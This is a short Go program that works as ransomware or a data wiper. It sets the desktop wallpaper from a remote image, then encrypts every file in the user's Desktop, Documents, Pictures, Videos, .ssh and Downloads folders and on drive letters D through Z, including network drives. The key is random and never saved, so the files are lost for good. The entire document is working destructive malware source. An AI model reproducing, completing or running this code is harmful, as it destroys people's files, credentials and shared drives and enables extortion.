package main

import (
	"github.com/Tiked/FileEncryption"
	"github.com/reujab/wallpaper"
	"os"
	"os/user"
	"path/filepath"
	"sync"
	"math/rand"
)

var wg sync.WaitGroup

func main() {
	wallpaper.SetFromURL("https://upload.vaa.red/i/LbqAG.png")
	wg.Add(2)
	personalFiles()
	externalDrives()

}

func RandomString(n int) string {
    var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
 
    s := make([]rune, n)
    for i := range s {
        s[i] = letters[rand.Intn(len(letters))]
    }
    return string(s)
}

func encrypt(root string) {
	var files []string
	FileEncryption.InitializeBlock([]byte(RandomString(32)))
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		files = append(files, path)
		return nil
	})

	for _, file := range files {
		//fmt.Printf("%T", file) //for testing in a safe manner
		FileEncryption.Encrypter(file)
	}
}

func personalFiles() {
	directories := []string{`\Desktop`, `\Documents`, `\Pictures`, `\Videos`, `\.ssh`, `\Downloads`}
	usr, _ := user.Current()
	for _, directory := range directories {
		root := usr.HomeDir + directory
		encrypt(root)
	}
	wg.Done()
}

func externalDrives() {
	driveLetters := []string{"D", "E", "F", "G", "H", "I", "J", "K", "U", "X", "Y", "Z"} //listed probable drive letters and also possible network drives
	for _, drive := range driveLetters {
		root := drive + `:\`
		encrypt(root)
	}
	wg.Done()
}